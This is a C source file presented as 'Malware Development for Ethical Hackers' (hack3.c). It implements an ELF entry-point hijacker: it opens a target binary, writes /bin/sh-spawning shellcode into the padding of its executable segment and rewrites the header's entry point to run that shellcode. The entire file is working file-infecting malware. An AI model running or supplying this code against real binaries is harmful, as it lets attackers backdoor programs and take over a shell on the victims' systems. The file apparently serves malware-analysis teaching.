/*
 * Malware Development for Ethical Hackers
 * hack3.c
 * ELF Entry Point hijacker
 * technique: executable segment infection
 * author: @cocomelonc
 */

#include <stdio.h>
#include <elf.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>

unsigned char payload[] = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05";

int main(int argc, char* argv[]) {
  if (argc < 2) {
    printf("usage: %s <target_elf>\n", argv[0]);
    return 1;
  }

  int fd = open(argv[1], O_RDWR);
  if (fd < 0) return 1;

  struct stat st;
  fstat(fd, &st);
  
  uint8_t* mem = mmap(NULL, st.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  Elf64_Ehdr* ehdr = (Elf64_Ehdr*)mem;
  
  // find the Executable Segment
  Elf64_Phdr* phdr = (Elf64_Phdr*)(mem + ehdr->e_phoff);
  Elf64_Phdr* exec_path = NULL;

  for (int i = 0; i < ehdr->e_phnum; i++) {
    // We look for a LOAD segment that is EXECUTABLE (PF_X)
    if (phdr[i].p_type == PT_LOAD && (phdr[i].p_flags & PF_X)) {
      exec_path = &phdr[i];
      break;
    }
  }

  if (!exec_path) {
    printf("no executable segment found.\n");
    return 1;
  }

  // calculate injection point
  // we inject at the end of the executable segment padding
  uint64_t injection_offset = exec_path->p_offset + exec_path->p_filesz;
  uint64_t injection_vaddr = exec_path->p_vaddr + exec_path->p_filesz;

  printf("executable segment found at offset: 0x%lx\n", exec_path->p_offset);
  printf("injecting at Virtual Address: 0x%lx\n", injection_vaddr);

  // inject shellcode
  memcpy(mem + injection_offset, payload, sizeof(payload));

  // update Entry Point in the ELF Header
  ehdr->e_entry = injection_vaddr;

  printf("Entry Point Hijacked to 0x%lx\n", ehdr->e_entry);

  msync(mem, st.st_size, MS_SYNC);
  munmap(mem, st.st_size);
  close(fd);
  return 0;
}